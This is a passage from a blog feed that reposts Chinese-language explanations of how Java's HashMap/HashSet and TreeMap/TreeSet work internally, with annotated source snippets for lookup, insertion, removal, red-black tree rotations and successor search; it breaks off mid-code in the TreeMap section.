        <content type="html"><![CDATA[<h1 id="HashSet-and-HashMap"><a href="#HashSet-and-HashMap" class="headerlink" title="HashSet and HashMap"></a>HashSet and HashMap</h1><h1 id="总体介绍"><a href="#总体介绍" class="headerlink" title="总体介绍"></a>总体介绍</h1><p>之所以把<em>HashSet</em>和<em>HashMap</em>放在一起讲解，是因为二者在Java里有着相同的实现，前者仅仅是对后者做了一层包装，也就是说<em>HashSet里面有一个HashMap</em>（适配器模式）*<em>。因此本文将重点分析</em>HashMap*。</p><p><em>HashMap</em>实现了<em>Map</em>接口，即允许放入<code>key</code>为<code>null</code>的元素，也允许插入<code>value</code>为<code>null</code>的元素；除该类未实现同步外，其余跟<code>Hashtable</code>大致相同；跟<em>TreeMap</em>不同，该容器不保证元素顺序，根据需要该容器可能会对元素重新哈希，元素的顺序也会被重新打散，因此不同时间迭代同一个<em>HashMap</em>的顺序可能会不同。 根据对冲突的处理方式不同，哈希表有两种实现方式，一种开放地址方式（Open addressing），另一种是冲突链表方式（Separate chaining with linked lists）。<strong>Java HashMap采用的是冲突链表方式</strong>。 <a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/HashMap_base.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/HashMap_base.png" alt="HashMap_base"></a></p><p>从上图容易看出，如果选择合适的哈希函数，<code>put()</code>和<code>get()</code>方法可以在常数时间内完成。但在对<em>HashMap</em>进行迭代时，需要遍历整个table以及后面跟的冲突链表。因此对于迭代比较频繁的场景，不宜将<em>HashMap</em>的初始大小设的过大。</p><p>有两个参数可以影响<em>HashMap</em>的性能：初始容量（inital capacity）和负载系数（load factor）。初始容量指定了初始<code>table</code>的大小，负载系数用来指定自动扩容的临界值。当<code>entry</code>的数量超过<code>capacity*load_factor</code>时，容器将自动扩容并重新哈希。对于插入元素较多的场景，将初始容量设大可以减少重新哈希的次数。</p><p>将对象放入到<em>HashMap</em>或<em>HashSet</em>中时，有两个方法需要特别关心：<code>hashCode()</code>和<code>equals()</code>。<strong>hashCode()方法决定了对象会被放到哪个bucket里，当多个对象的哈希值冲突时，equals()方法决定了这些对象是否是“同一个对象”</strong>。所以，如果要将自定义的对象放入到<code>HashMap</code>或<code>HashSet</code>中，需要<em>@Override</em><code>hashCode()</code>和<code>equals()</code>方法。</p><h1 id="方法剖析"><a href="#方法剖析" class="headerlink" title="方法剖析"></a>方法剖析</h1><h2 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h2><p><code>get(Object key)</code>方法根据指定的<code>key</code>值返回对应的<code>value</code>，该方法调用了<code>getEntry(Object key)</code>得到相应的<code>entry</code>，然后返回<code>entry.getValue()</code>。因此<code>getEntry()</code>是算法的核心。 算法思想是首先通过<code>hash()</code>函数得到对应<code>bucket</code>的下标，然后依次遍历冲突链表，通过<code>key.equals(k)</code>方法来判断是否是要找的那个<code>entry</code>。 <a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/HashMap_getEntry.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/HashMap_getEntry.png" alt="HashMap_getEntry"></a>上图中<code>hash(k)&amp;(table.length-1)</code>等价于<code>hash(k)%table.length</code>，原因是<em>HashMap</em>要求<code>table.length</code>必须是2的指数，因此<code>table.length-1</code>就是二进制低位全是1，跟<code>hash(k)</code>相与会将哈希值的高位全抹掉，剩下的就是余数了。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//getEntry()方法</span><span class="token keyword">final</span> Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> <span class="token function">getEntry</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> table<span class="token punctuation">[</span>hash<span class="token operator">&amp;</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//得到冲突链表</span>         e <span class="token operator">!=</span> null<span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//依次遍历冲突链表中的每个entry</span>        Object k<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//依据equals()方法判断是否相等</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash <span class="token operator">&amp;&amp;</span>            <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">=</span> e<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token operator">||</span> <span class="token punctuation">(</span>key <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> e<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="put"><a href="#put" class="headerlink" title="put()"></a>put()</h2><p><code>put(K key, V value)</code>方法是将指定的<code>key, value</code>对添加到<code>map</code>里。该方法首先会对<code>map</code>做一次查找，看是否包含该元组，如果已经包含则直接返回，查找过程类似于<code>getEntry()</code>方法；如果没有找到，则会通过<code>addEntry(int hash, K key, V value, int bucketIndex)</code>方法插入新的<code>entry</code>，插入方式为<strong>头插法</strong>。 <a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/HashMap_addEntry.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/HashMap_addEntry.png" alt="HashMap_addEntry"></a></p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//addEntry()</span><span class="token keyword">void</span> <span class="token function">addEntry</span><span class="token punctuation">(</span><span class="token keyword">int</span> hash<span class="token punctuation">,</span> K key<span class="token punctuation">,</span> V value<span class="token punctuation">,</span> <span class="token keyword">int</span> bucketIndex<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">>=</span> threshold<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>null <span class="token operator">!=</span> table<span class="token punctuation">[</span>bucketIndex<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">resize</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//自动扩容，并重新哈希</span>        hash <span class="token operator">=</span> <span class="token punctuation">(</span>null <span class="token operator">!=</span> key<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        bucketIndex <span class="token operator">=</span> hash <span class="token operator">&amp;</span> <span class="token punctuation">(</span>table<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//hash%table.length</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//在冲突链表头部插入新的entry</span>    Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> table<span class="token punctuation">[</span>bucketIndex<span class="token punctuation">]</span><span class="token punctuation">;</span>    table<span class="token punctuation">[</span>bucketIndex<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>    size<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="remove"><a href="#remove" class="headerlink" title="remove()"></a>remove()</h2><p><code>remove(Object key)</code>的作用是删除<code>key</code>值对应的<code>entry</code>，该方法的具体逻辑是在<code>removeEntryForKey(Object key)</code>里实现的。<code>removeEntryForKey()</code>方法会首先找到<code>key</code>值对应的<code>entry</code>，然后删除该<code>entry</code>（修改链表的相应引用）。查找过程跟<code>getEntry()</code>过程类似。 <a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/HashMap_removeEntryForKey.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/HashMap_removeEntryForKey.png" alt="HashMap_removeEntryForKey"></a></p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//removeEntryForKey()</span><span class="token keyword">final</span> Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> <span class="token function">removeEntryForKey</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">indexFor</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//hash&amp;(table.length-1)</span>    Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> prev <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//得到冲突链表</span>    Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> prev<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>e <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//遍历冲突链表</span>        Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> next <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        Object k<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash <span class="token operator">&amp;&amp;</span>            <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">=</span> e<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token operator">||</span> <span class="token punctuation">(</span>key <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//找到要删除的entry</span>            modCount<span class="token operator">++</span><span class="token punctuation">;</span> size<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>prev <span class="token operator">==</span> e<span class="token punctuation">)</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> next<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除的是冲突链表的第一个entry</span>            <span class="token keyword">else</span> prev<span class="token punctuation">.</span>next <span class="token operator">=</span> next<span class="token punctuation">;</span>            <span class="token keyword">return</span> e<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        prev <span class="token operator">=</span> e<span class="token punctuation">;</span> e <span class="token operator">=</span> next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> e<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h1 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h1><p>前面已经说过<em>HashSet</em>是对<em>HashMap</em>的简单包装，对<em>HashSet</em>的函数调用都会转换成合适的<em>HashMap</em>方法，因此<em>HashSet</em>的实现非常简单，只有不到300行代码。这里不再赘述。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//HashSet是对HashMap的简单包装</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HashSet</span><span class="token operator">&lt;</span>E<span class="token operator">></span><span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">private</span> <span class="token keyword">transient</span> HashMap<span class="token operator">&lt;</span>E<span class="token punctuation">,</span>Object<span class="token operator">></span> map<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//HashSet里面有一个HashMap</span>    <span class="token comment" spellcheck="true">// Dummy value to associate with an Object in the backing Map</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> Object PRESENT <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">HashSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">add</span><span class="token punctuation">(</span>E e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//简单的方法转换</span>        <span class="token keyword">return</span> map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> PRESENT<span class="token punctuation">)</span><span class="token operator">==</span>null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span></code></pre><p>本文转载自: <a href="https://github.com/CarpenterLee/JCFInternals/blob/master/markdown/6-HashSet%20and%20HashMap.md#hashset-and-hashmap">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java容器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TreeSet and TreeMap</title>
      <link href="/2019/01/19/java/java-rong-qi/treeset-and-treemap/"/>
      <url>/2019/01/19/java/java-rong-qi/treeset-and-treemap/</url>
      
        <content type="html"><![CDATA[<h1 id="TreeSet-and-TreeMap"><a href="#TreeSet-and-TreeMap" class="headerlink" title="TreeSet and TreeMap"></a>TreeSet and TreeMap</h1><h1 id="总体介绍"><a href="#总体介绍" class="headerlink" title="总体介绍"></a>总体介绍</h1><p>之所以把<em>TreeSet</em>和<em>TreeMap</em>放在一起讲解，是因为二者在Java里有着相同的实现，前者仅仅是对后者做了一层包装，也就是说<em>TreeSet里面有一个TreeMap</em>（适配器模式）*<em>。因此本文将重点分析</em>TreeMap*。</p><p>Java <em>TreeMap</em>实现了<em>SortedMap</em>接口，也就是说会按照<code>key</code>的大小顺序对<em>Map</em>中的元素进行排序，<code>key</code>大小的评判可以通过其本身的自然顺序（natural ordering），也可以通过构造时传入的比较器（Comparator）。</p><p><strong>TreeMap底层通过红黑树（Red-Black tree）实现</strong>，也就意味着<code>containsKey()</code>, <code>get()</code>, <code>put()</code>, <code>remove()</code>都有着<code>log(n)</code>的时间复杂度。其具体算法实现参照了《算法导论》。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/TreeMap_base.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/TreeMap_base.png" alt="TreeMap_base.png"></a></p><p>出于性能原因，<em>TreeMap</em>是非同步的（not synchronized），如果需要在多线程环境使用，需要程序员手动同步；或者通过如下方式将<em>TreeMap</em>包装成（wrapped）同步的：</p><pre class=" language-java"><code class="language-java">SortedMap m <span class="token operator">=</span> Collections<span class="token punctuation">.</span><span class="token function">synchronizedSortedMap</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TreeMap</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>红黑树是一种近似平衡的二叉查找树，它能够确保任何一个节点的左右子树的高度差不会超过二者中较低那个的一陪</strong>。具体来说，红黑树是满足如下条件的二叉查找树（binary search tree）：</p><ol><li>每个节点要么是红色，要么是黑色。</li><li>根节点必须是黑色</li><li>红色节点不能连续（也即是，红色节点的孩子和父亲都不能是红色）。</li><li>对于每个节点，从该点至<code>null</code>（树尾端）的任何路径，都含有相同个数的黑色节点。</li></ol><p>在树的结构发生改变时（插入或者删除操作），往往会破坏上述条件3或条件4，需要通过调整使得查找树重新满足红黑树的约束条件。</p><h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><p>前文说到当查找树的结构发生改变时，红黑树的约束条件可能被破坏，需要通过调整使得查找树重新满足红黑树的约束条件。调整可以分为两类：一类是颜色调整，即改变某个节点的颜色；另一类是结构调整，集改变检索树的结构关系。结构调整过程包含两个基本操作：<strong>左旋（Rotate Left），右旋（RotateRight）</strong>。</p><h2 id="左旋"><a href="#左旋" class="headerlink" title="左旋"></a>左旋</h2><p>左旋的过程是将<code>x</code>的右子树绕<code>x</code>逆时针旋转，使得<code>x</code>的右子树成为<code>x</code>的父亲，同时修改相关节点的引用。旋转之后，二叉查找树的属性仍然满足。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/TreeMap_rotateLeft.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/TreeMap_rotateLeft.png" alt="TreeMap_rotateLeft.png"></a></p><p><em>TreeMap</em>中左旋代码如下：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//Rotate Left</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">rotateLeft</span><span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> p<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> r <span class="token operator">=</span> p<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        p<span class="token punctuation">.</span>right <span class="token operator">=</span> r<span class="token punctuation">.</span>left<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span>            r<span class="token punctuation">.</span>left<span class="token punctuation">.</span>parent <span class="token operator">=</span> p<span class="token punctuation">;</span>        r<span class="token punctuation">.</span>parent <span class="token operator">=</span> p<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>parent <span class="token operator">==</span> null<span class="token punctuation">)</span>            root <span class="token operator">=</span> r<span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>left <span class="token operator">==</span> p<span class="token punctuation">)</span>            p<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>left <span class="token operator">=</span> r<span class="token punctuation">;</span>        <span class="token keyword">else</span>            p<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>right <span class="token operator">=</span> r<span class="token punctuation">;</span>        r<span class="token punctuation">.</span>left <span class="token operator">=</span> p<span class="token punctuation">;</span>        p<span class="token punctuation">.</span>parent <span class="token operator">=</span> r<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="右旋"><a href="#右旋" class="headerlink" title="右旋"></a>右旋</h2><p>右旋的过程是将<code>x</code>的左子树绕<code>x</code>顺时针旋转，使得<code>x</code>的左子树成为<code>x</code>的父亲，同时修改相关节点的引用。旋转之后，二叉查找树的属性仍然满足。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/TreeMap_rotateRight.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/TreeMap_rotateRight.png" alt="TreeMap_rotateRight.png"></a></p><p><em>TreeMap</em>中右旋代码如下：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//Rotate Right</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">rotateRight</span><span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> p<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> l <span class="token operator">=</span> p<span class="token punctuation">.</span>left<span class="token punctuation">;</span>        p<span class="token punctuation">.</span>left <span class="token operator">=</span> l<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span> l<span class="token punctuation">.</span>right<span class="token punctuation">.</span>parent <span class="token operator">=</span> p<span class="token punctuation">;</span>        l<span class="token punctuation">.</span>parent <span class="token operator">=</span> p<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>parent <span class="token operator">==</span> null<span class="token punctuation">)</span>            root <span class="token operator">=</span> l<span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>right <span class="token operator">==</span> p<span class="token punctuation">)</span>            p<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>right <span class="token operator">=</span> l<span class="token punctuation">;</span>        <span class="token keyword">else</span> p<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>left <span class="token operator">=</span> l<span class="token punctuation">;</span>        l<span class="token punctuation">.</span>right <span class="token operator">=</span> p<span class="token punctuation">;</span>        p<span class="token punctuation">.</span>parent <span class="token operator">=</span> l<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="寻找节点后继"><a href="#寻找节点后继" class="headerlink" title="寻找节点后继"></a>寻找节点后继</h2><p>对于一棵二叉查找树，给定节点t，其后继（树中比大于t的最小的那个元素）可以通过如下方式找到：</p><blockquote><ol><li>t的右子树不空，则t的后继是其右子树中最小的那个元素。</li><li>t的右孩子为空，则t的后继是其第一个向左走的祖先。</li></ol></blockquote><p>后继节点在红黑树的删除操作中将会用到。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/TreeMap_successor.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/TreeMap_successor.png" alt="TreeMap_successor.png"></a></p><p><em>TreeMap</em>中寻找节点后继的代码如下：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 寻找节点后继函数successor()</span><span class="token keyword">static</span> <span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> TreeMap<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> <span class="token function">successor</span><span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> t<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> null<span class="token punctuation">)</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>t<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 1. t的右子树不空，则t的后继是其右子树中最小的那个元素</span>        Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> p <span class="token operator">=</span> t<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span>            p <span class="token operator">=</span> p<span class="token punctuation">.</span>left<span class="token punctuation">;</span>        <span class="token keyword">return</span> p<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 2. t的右孩子为空，则t的后继是其第一个向左走的祖先</span>        Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> p <span class="token operator">=</span> t<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> ch <span class="token operator">=</span> t<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> ch <span class="token operator">==</span> p<span class="token punctuation">.</span>right<span class="token punctuation">)</span> <span class="token punctuation">{</span>            ch <span class="token operator">=</span> p<span class="token punctuation">;</span>            p <span class="token operator">=</span> p<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> p<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id="方法剖析"><a href="#方法剖析" class="headerlink" title="方法剖析"></a>方法剖析</h1><h2 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h2><p><code>get(Object key)</code>方法根据指定的<code>key</code>值返回对应的<code>value</code>，该方法调用了<code>getEntry(Object key)</code>得到相应的<code>entry</code>，然后返回<code>entry.value</code>。因此<code>getEntry()</code>是算法的核心。算法思想是根据<code>key</code>的自然顺序（或者比较器顺序）对二叉查找树进行查找，直到找到满足<code>k.compareTo(p.key) == 0</code>的<code>entry</code>。</p><p><a href="https://github.com/CarpenterLee/JCFInternals/blob/master/PNGFigures/TreeMap_getEntry.png"><img src="https://github.com/CarpenterLee/JCFInternals/raw/master/PNGFigures/TreeMap_getEntry.png" alt="TreeMap_getEntry.png"></a></p><p>具体代码如下：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//getEntry()方法</span><span class="token keyword">final</span> Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> <span class="token function">getEntry</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//不允许key值为null</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Comparable<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> K<span class="token operator">></span> k <span class="token operator">=</span> <span class="token punctuation">(</span>Comparable<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> K<span class="token operator">></span><span class="token punctuation">)</span> key<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//使用元素的自然顺序</span>    Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> p <span class="token operator">=</span> root<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> cmp <span class="token operator">=</span> k<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token 